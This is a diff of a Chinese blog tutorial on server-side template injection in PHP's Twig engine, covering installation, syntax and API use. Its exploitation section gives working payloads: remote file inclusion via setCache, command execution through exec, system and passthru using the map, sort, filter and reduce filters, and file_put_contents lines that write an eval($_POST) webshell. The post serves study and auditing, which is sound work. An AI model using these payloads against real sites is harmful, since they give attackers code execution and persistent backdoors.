@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-uk" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='SSTI 模板注入：Twig(PHP) 接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twi'><title>SSTI 模板注入: Twig (PHP)</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twig Docs: Introduction Twig 3.x需要PHP版本高'><title>SSTI 模板注入: Twig (PHP)</title>
 
 <link rel='canonical' href='https://ginkgo.org.cn/posts/ssti_twig/'>
 
 <link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SSTI 模板注入: Twig (PHP)'>
-<meta property='og:description' content='SSTI 模板注入：Twig(PHP) 接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twi'>
+<meta property='og:description' content='接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twig Docs: Introduction Twig 3.x需要PHP版本高'>
 <meta property='og:url' content='https://ginkgo.org.cn/posts/ssti_twig/'>
 <meta property='og:site_name' content='Under The Ginkgo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ssti' /><meta property='article:tag' content='twig' /><meta property='article:tag' content='php' /><meta property='article:tag' content='web_security' /><meta property='article:tag' content='template_engine' /><meta property='article:tag' content='server_side' /><meta property='article:published_time' content='2022-07-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-09-07T11:11:49&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ssti' /><meta property='article:tag' content='twig' /><meta property='article:tag' content='php' /><meta property='article:tag' content='web_security' /><meta property='article:tag' content='template_engine' /><meta property='article:tag' content='server_side' /><meta property='article:published_time' content='2022-07-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-09T22:31:18&#43;08:00'/>
 <meta name="twitter:title" content="SSTI 模板注入: Twig (PHP)">
-<meta name="twitter:description" content="SSTI 模板注入：Twig(PHP) 接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twi">
+<meta name="twitter:description" content="接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twig Docs: Introduction Twig 3.x需要PHP版本高">
     <link rel="shortcut icon" href="/img/favicon.ico" />
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
@@ -275,9 +275,8 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <h2 id="ssti-模板注入-twig--php">SSTI 模板注入：Twig(PHP)</h2>
-<p>接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 <!-- raw HTML omitted --></p>
-<h3 id="简介与安装">简介与安装</h3>
+    <p>接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 <!-- raw HTML omitted --></p>
+<h2 id="简介与安装">简介与安装</h2>
 <p>详见官网安装文档：<a class="link" href="https://twig.symfony.com/doc/3.x/intro.html#installation"  target="_blank" rel="noopener"
     >Twig Docs: Introduction</a> <!-- raw HTML omitted --></p>
 <p>Twig 3.x需要PHP版本高于7.2.5 <!-- raw HTML omitted --></p>
@@ -285,8 +284,10 @@ if (!doNotTrack) {
 <p>建议通过Composer命令进行安装 <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">composer require <span class="s2">&#34;twig/twig:^3.0&#34;</span>
 </span></span></code></pre></div><p>基础的API调用实例 <!-- raw HTML omitted --></p>
-<p>通过require包含twig的项目文件，可以在Twig的命名空间下调用ArrayLoader类来加载模板（例如这里index就是一个模板），以及Environment类创建环境保存配置 <!-- raw HTML omitted --></p>
-<p><code>render()</code> 方法的第一个参数是用来加载模板的，第二个参数用来对模板中的占位内容进行填充（渲染） <!-- raw HTML omitted --></p>
+<p>通过require包含twig的项目文件，可以在Twig的命名空间下调用ArrayLoader类来加载模板（例如这里index就是一个模板），以及Environment类创建环境保存配置： <!-- raw HTML omitted --></p>
+<ul>
+<li><code>render()</code> 方法的第一个参数是用来加载模板的，第二个参数用来对模板中的占位内容进行填充（渲染） <!-- raw HTML omitted --></li>
+</ul>
 <p>这里 $twig-render 方法就是加载了模板 <code>index</code>, 并在 <code>{{name}}</code> 的位置上填充了 <code>Fabien</code>  <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;/path/to/vendor/autoload.php&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -296,15 +297,15 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Fabien&#39;</span><span class="p">]);</span>
-</span></span></code></pre></div><p>另一种形式的加载起就是直接将模板以文件的形式进行存储，我认为这也是更为常见的形式，用到的加载器类是 <code>FilesystemLoader</code> 可以直接加载存储模板的目录 <!-- raw HTML omitted --></p>
-<p>可以看到这里变成了加载一个模板文件 <code>index.html</code>  <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>另一种形式的加载起就是直接将模板以文件的形式进行存储，我认为这也是更为常见的形式，用到的加载器类是 <code>FilesystemLoader</code> 可以直接加载存储模板的目录： <!-- raw HTML omitted --></p>
+<p>可以看到这里变成了加载一个模板文件 <code>index.html</code>; <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\FilesystemLoader</span><span class="p">(</span><span class="s1">&#39;/path/to/templates&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">,</span> <span class="p">[</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;cache&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/path/to/compilation_cache&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl"><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Fabien&#39;</span><span class="p">]);</span>
-</span></span></code></pre></div><h3 id="基础语法">基础语法</h3>
+</span></span></code></pre></div><h2 id="基础语法">基础语法</h2>
 <p>参考：<a class="link" href="https://twig.symfony.com/doc/3.x/templates.html"  target="_blank" rel="noopener"
     >Twig for Template Designers</a> <!-- raw HTML omitted --></p>
 <p>就像我们在模板引擎一节中提到的那样，模板，template本质上就是一个文本文件，通过与数据库的数据进行结合之后，用来生成我们所需要的任何基于文本的格式文件 (e.g., HTML, XML, CSV, LaTeX)，因此也没有特别的后缀名，.html, .xml, .twig 都可以 <!-- raw HTML omitted --></p>
@@ -513,7 +514,7 @@ if (!doNotTrack) {
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span> <span class="s1">&#39;{{&#39;</span> <span class="p">}}</span>
 </span></span></code></pre></div></dd>
 </dl>
-<h3 id="twig的api使用">Twig的API使用</h3>
+<h2 id="twig的api使用">Twig的API使用</h2>
 <p>在上一节中我们介绍了如何设计Twig模板，在本章中，我们将会介绍如何使用Twig的API来对模板进行操作，本节主要参考：<a class="link" href="https://twig.symfony.com/doc/3.x/api.html"  target="_blank" rel="noopener"
     >Twig for Developers</a> <!-- raw HTML omitted --></p>
 <p>从官网文档的标题，也很能体现模板引擎的意义，Twig for Template Designers主要就是写给那些设计模板，页面的显示内容的人（前端？），而Twig for Developers更多的是针对模板内容的处理，这样就很好的把模板和数据操作分开，把显示和内容分开。 <!-- raw HTML omitted --></p>
@@ -553,7 +554,7 @@ if (!doNotTrack) {
 <dd>加载器的主要职责就是加载模板（例如从文件系统中） <!-- raw HTML omitted -->
 <ul>
 <li>
-<p><strong>Compilation Cache 编译缓存:</strong> 所有的模板加载器都会将文件系统中编译过的模板存储在缓存中以供将来使用，以此来提高使用的效率，不用重复加载 <!-- raw HTML omitted --></p>
+<p><strong>Compilation Cache 编译缓存:</strong> 所有的模板加载器都会将文件系统中编译过的模板存储在缓存中以供将来使用，以此来提高使用的效率，不用重复加载； <!-- raw HTML omitted --></p>
 </li>
 <li>
 <p><strong>内置的加载器:</strong> 1.  <code>\Twig\Loader\FilesystemLoader</code>, 加载器从文件系统中加载模板 <!-- raw HTML omitted --></p>
@@ -591,35 +592,27 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </ul>
 </dd>
 </dl>
-<h3 id="漏洞利用">漏洞利用</h3>
-<p>在介绍了Twig的基础模板语法与API使用之后，我们来看看不同版本的Twig都有哪些漏洞可以利用 <!-- raw HTML omitted --></p>
-<h4 id="1-dot-x">1.x</h4>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>在介绍了Twig的基础模板语法与API使用之后，我们来看看不同版本的Twig都有哪些漏洞可以利用； <!-- raw HTML omitted --></p>
+<h3 id="1-dot-x">1.x</h3>
 <p>我们回顾一下之前在基础语法中提到过，Twig拥有三个全局变量 <!-- raw HTML omitted --></p>
 <ul>
 <li>
-<p>_self: 对于当前模板对象实例的引用 <!-- raw HTML omitted --></p>
+<p>_self: 对于当前模板对象实例的引用； <!-- raw HTML omitted --></p>
 </li>
 <li>
-<p>_context: 对于上下文的引用 <!-- raw HTML omitted --></p>
+<p>_context: 对于上下文的引用； <!-- raw HTML omitted --></p>
 </li>
 <li>
-<p>_charset: 对于当前字符集的引用 <!-- raw HTML omitted --></p>
+<p>_charset: 对于当前字符集的引用； <!-- raw HTML omitted --></p>
 </li>
 </ul>
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>setCache</p>
-<p>在1.x版本中，我们主要就是要利用其中的其中的 <code>_self</code> 变量，因为其代表了对于当前模板对象实例（\Twig\Template）的引用，其中包含的 <code>env</code> 属性指向了 <code>\Twig\Environment</code> 对象实例的引用，这样我们就可以继续利用Twig环境对象实例中的方法 <!-- raw HTML omitted --></p>
+<h4 id="setcache">setCache</h4>
+<p>在1.x版本中，我们主要就是要利用其中的其中的 <code>_self</code> 变量，因为其代表了对于当前模板对象实例（\Twig\Template）的引用，其中包含的 <code>env</code> 属性指向了 <code>\Twig\Environment</code> 对象实例的引用，这样我们就可以继续利用Twig环境对象实例中的方法： <!-- raw HTML omitted --></p>
 <p>常见的 payload 就有： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">setCache</span><span class="p">(</span><span class="s2">&#34;ftp://ip:port&#34;</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">loadTemplate</span><span class="p">(</span><span class="s2">&#34;backdoor&#34;</span><span class="p">)}}</span>
-</span></span></code></pre></div><p>setCache是我们之前提到过的，设置编译模板的缓存目录，接着在我们改变当前模板的缓存目录之后，再次调用 <code>loadTemplate</code> 函数就可以包含任意我们想要的文件了，在allow_url_include开启的条件下，我们就实现了远程文件包含 <!-- raw HTML omitted --></p>
-</li>
-</ul>
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>getFilter</p>
+</span></span></code></pre></div><p>setCache是我们之前提到过的，设置编译模板的缓存目录，接着在我们改变当前模板的缓存目录之后，再次调用 <code>loadTemplate</code> 函数就可以包含任意我们想要的文件了，在allow_url_include开启的条件下，我们就实现了远程文件包含： <!-- raw HTML omitted --></p>
+<h4 id="getfilter">getFilter</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getFilter</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="o">...</span>
@@ -635,16 +628,16 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterCallbacks</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$callable</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>我们可以从 <code>getFilter</code> 源码中发现危险函数 <code>call_user_func</code>, 通过传入 $name 参数到该函数中，就可以调用任意PHP函数 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>我们可以从 <code>getFilter</code> 源码中发现危险函数 <code>call_user_func</code>, 通过传入 $name 参数到该函数中，就可以调用任意PHP函数； <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">getFilter</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="c1">// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </span></span></span></code></pre></div><p>在Twig 2.x 以及 3.x 的版本中， <code>_self</code> 的作用发生了变化，只能返回当前实例名的字符串，因此这个payload只能够再1.x版本使用 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-07-01_17-27-09_screenshot.png"
-             alt="Figure 1: Deprecated Features of Twig 1.x" width="700px"/><figcaption>
-                <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted --><a class="link" href="https://twig.symfony.com/doc/1.x/deprecated.html#globals"  target="_blank" rel="noopener"
-        >Deprecated Features of Twig 1.x</a></p>
-            </figcaption>
-    </figure>
+         alt="Figure 1: Deprecated Features of Twig 1.x" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted --><a class="link" href="https://twig.symfony.com/doc/1.x/deprecated.html#globals"  target="_blank" rel="noopener"
+    >Deprecated Features of Twig 1.x</a></p>
+        </figcaption>
+</figure>
  <!-- raw HTML omitted --></p>
 <p>同时 <code>getFilter</code> 方法中也不再包含危险的函数了： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getFilter</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$name</span><span class="p">)</span><span class="o">:</span> <span class="o">?</span><span class="nx">TwigFilter</span>
@@ -681,15 +674,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterCallbacks</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$callable</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span></code></pre></div><p>我觉得这就是一个很好的思路，在我们进行代码审计的时候，可以先找到这些危险的函数，然后再追溯其的使用，判断是否会有用户的输出能够调用这类函数 <!-- raw HTML omitted --></p>
-</li>
-</ul>
-<h4 id="2-dot-x-3-dot-x">2.x / 3.x</h4>
+<h3 id="2-dot-x-3-dot-x">2.x / 3.x</h3>
 <p>在2.x / 3.x中， <code>_self</code> 变量已经没法被我们所利用了，但是我们可以借助新版本中的一些过滤器来实现攻击的目的。 <!-- raw HTML omitted --></p>
 <p>我们将介绍4个过滤器： <!-- raw HTML omitted --></p>
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>map</p>
+<h4 id="map">map</h4>
 <p><code>map</code> 过滤器将一个 <code>arrow function</code> 应用于 <code>sequence</code> 或者 <code>mapping</code> （因为没有中文文档，所以不是很敢翻译这些既陌生又熟悉的名词，大家可以根据例子体会一下），文档详见：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/map.html"  target="_blank" rel="noopener"
     >map</a> <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">people</span> <span class="o">=</span> <span class="p">[</span>
@@ -755,12 +743,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="p">{{{</span><span class="s2">&#34;&lt;?php phpinfo();eval(</span><span class="si">$_POST[whoami]</span><span class="s2">)&#34;</span><span class="o">:</span><span class="s2">&#34;/var/www/html/shell.php&#34;</span><span class="p">}</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">)}}</span>    <span class="c1">// 写 Webshell
 </span></span></span></code></pre></div><p>我们利用 <code>$arrow</code> 可以不经检查就被直接当作函数来执行的特点，还可以发现其他的几个过滤器也存在相同的问题 <!-- raw HTML omitted --></p>
-</li>
-</ul>
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>sort</p>
+<h4 id="sort">sort</h4>
 <p><code>sort</code> 过滤器可以用来给数组进行排序，介绍详见：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/sort.html"  target="_blank" rel="noopener"
     >sort</a> <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">user</span> <span class="nx">in</span> <span class="nx">users</span><span class="o">|</span><span class="nx">sort</span> <span class="o">%</span><span class="p">}</span>
@@ -796,21 +779,16 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-07-01_23-34-07_screenshot.png"
-             alt="Figure 2: uasort 函数测试命令行执行" width="300px"/><figcaption>
-                <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->uasort 函数测试命令行执行</p>
-            </figcaption>
-    </figure>
+         alt="Figure 2: uasort 函数测试命令行执行" width="300px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->uasort 函数测试命令行执行</p>
+        </figcaption>
+</figure>
  <!-- raw HTML omitted --></p>
 <p>同样可以用来进行远程代码执行，payload如下： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;passthru&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}</span>    <span class="c1">// 无回显
-</span></span></span></code></pre></div></li>
-</ul>
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>filter</p>
+</span></span></span></code></pre></div><h4 id="filter">filter</h4>
 <p><code>filter</code> 过滤器，原汁原味的过滤器，主要功能就是通过给定条件来筛选数据，详见：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/filter.html"  target="_blank" rel="noopener"
     >filter</a> <!-- raw HTML omitted --></p>
 <p><code>filter</code> 过滤器可以通过传入一个 <code>arrow function</code> 来规定想要的数据的范围 <!-- raw HTML omitted --></p>
@@ -856,21 +834,16 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </ol>
 <p>也就是说这里$arrow直接可以配合$array进行执行 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-07-01_23-29-52_screenshot.png"
-             alt="Figure 3: array_filter 函数测试命令行执行" width="300px"/><figcaption>
-                <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->array_filter 函数测试命令行执行</p>
-            </figcaption>
-    </figure>
+         alt="Figure 3: array_filter 函数测试命令行执行" width="300px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->array_filter 函数测试命令行执行</p>
+        </figcaption>
+</figure>
  <!-- raw HTML omitted --></p>
 <p>因此也可以payload于之前类似 <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;passthru&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}</span>    <span class="c1">// 无回显
-</span></span></span></code></pre></div></li>
-</ul>
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>reduce</p>
+</span></span></span></code></pre></div><h4 id="reduce">reduce</h4>
 <p><code>reduce</code> 过滤器将对数组进行处理，通过一个 <code>arrow_function</code> 来定义操作的规则，迭代地将数组中的元素进行合并直至一个元素，详见官方文档：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/reduce.html"  target="_blank" rel="noopener"
     >reduce</a> <!-- raw HTML omitted --></p>
 <p>比如就可以将数组中所有的元素相加 <!-- raw HTML omitted --></p>
@@ -889,21 +862,16 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
 </span></span></code></pre></div><p>其中的 <code>array_reduce</code> 方法同样也也将 $arrow 作为回调函数直接执行，并将 $array 作为参数带入 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-07-01_23-40-14_screenshot.png"
-             alt="Figure 4: array_reduce 函数测试命令行调用" width="300px"/><figcaption>
-                <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->array_reduce 函数测试命令行调用</p>
-            </figcaption>
-    </figure>
+         alt="Figure 4: array_reduce 函数测试命令行调用" width="300px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->array_reduce 函数测试命令行调用</p>
+        </figcaption>
+</figure>
  <!-- raw HTML omitted --></p>
 <p>那么payload同样也是类似的，不过这里要传入的参数需要包含至少两个，这样才符合两个操作值： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;passthru&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)}}</span>    <span class="c1">// 无回显
-</span></span></span></code></pre></div></li>
-</ul>
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>通用payload</p>
+</span></span></span></code></pre></div><h4 id="通用payload">通用payload</h4>
 <p>来源：<a class="link" href="https://xz.aliyun.com/t/7518#toc-5"  target="_blank" rel="noopener"
     >TWIG 全版本通用 SSTI payloads</a> <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span>
@@ -911,9 +879,8 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{{</span><span class="s2">&#34;&lt;?php phpinfo();&#34;</span><span class="o">:</span><span class="s2">&#34;/var/www/html/shell.php&#34;</span><span class="p">}</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">)}}</span>
-</span></span></code></pre></div></li>
-</ul>
-<h3 id="reference">Reference</h3>
+</span></span></code></pre></div><h2 id="reference">Reference</h2>
+<blockquote>
 <p><a class="link" href="https://twig.symfony.com/"  target="_blank" rel="noopener"
     >Twig</a> <!-- raw HTML omitted --></p>
 <p><a class="link" href="https://twig.symfony.com/doc/3.x/intro.html#installation"  target="_blank" rel="noopener"
@@ -934,6 +901,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
     >reduce</a> <!-- raw HTML omitted --></p>
 <p><a class="link" href="https://xz.aliyun.com/t/7518#toc-5"  target="_blank" rel="noopener"
     >TWIG 全版本通用 SSTI payloads</a> <!-- raw HTML omitted --></p>
+</blockquote>
 
 </section>
 
@@ -979,7 +947,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 
 
         <span>
-            Last updated on Sep 07, 2022 11:11 CST
+            Last updated on Nov 09, 2022 22:31 CST
         </span>
     </section></footer>
 
@@ -1254,20 +1222,29 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#ssti-模板注入-twig--php">SSTI 模板注入：Twig(PHP)</a>
+    <li><a href="#简介与安装">简介与安装</a></li>
+    <li><a href="#基础语法">基础语法</a></li>
+    <li><a href="#twig的api使用">Twig的API使用</a></li>
+    <li><a href="#漏洞利用">漏洞利用</a>
       <ul>
-        <li><a href="#简介与安装">简介与安装</a></li>
-        <li><a href="#基础语法">基础语法</a></li>
-        <li><a href="#twig的api使用">Twig的API使用</a></li>
-        <li><a href="#漏洞利用">漏洞利用</a>
+        <li><a href="#1-dot-x">1.x</a>
           <ul>
-            <li><a href="#1-dot-x">1.x</a></li>
